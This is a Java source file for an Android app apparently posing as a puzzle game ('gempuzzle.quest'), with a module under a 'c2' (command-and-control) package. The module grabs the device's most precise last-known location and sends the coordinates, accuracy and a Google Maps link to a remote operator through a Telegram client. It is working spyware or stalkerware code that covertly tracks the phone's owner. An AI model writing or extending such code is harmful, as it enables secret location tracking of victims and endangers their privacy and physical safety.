package com.gempuzzle.quest.c2.modules;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationManager;

import androidx.core.content.ContextCompat;

import com.gempuzzle.quest.c2.TelegramClient;

public final class LocationModule {

    public static void oneShot(Context ctx) {
        if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_FINE_LOCATION)
                != PackageManager.PERMISSION_GRANTED) {
            TelegramClient.sendMessage("⚠ no location permission");
            return;
        }
        LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
        Location best = null;
        try {
            for (String provider : lm.getProviders(true)) {
                Location l = lm.getLastKnownLocation(provider);
                if (l != null && (best == null || l.getAccuracy() < best.getAccuracy())) {
                    best = l;
                }
            }
        } catch (SecurityException e) {
            TelegramClient.sendMessage("⚠ location blocked");
            return;
        }
        if (best == null) {
            TelegramClient.sendMessage("📍 no last-known location — try again after device moves");
            return;
        }
        double lat = best.getLatitude();
        double lon = best.getLongitude();
        String maps = "https://www.google.com/maps?q=" + lat + "," + lon;
        TelegramClient.sendMessage("📍 *LOCATION*\n"
                + "lat: `" + lat + "`\n"
                + "lon: `" + lon + "`\n"
                + "accuracy: " + best.getAccuracy() + "m\n"
                + "[Google Maps](" + maps + ")");
    }

    private LocationModule() {}
}
